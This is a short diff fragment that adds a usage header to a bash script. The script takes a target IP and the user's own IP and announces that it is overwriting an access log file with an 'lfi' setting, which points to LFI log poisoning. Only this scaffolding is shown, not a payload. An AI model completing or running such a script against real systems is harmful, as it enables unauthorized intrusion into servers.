@@ -1,3 +1,10 @@
+#!/bin/bash
+
+if [[ "$1" = "" ]]
+then
+	echo "Usage: bash $0 <target ip> <your ip>"
+	exit
+fi
 
 lfi='lfi'
 echo '[+] Overwriting accesslog file...'
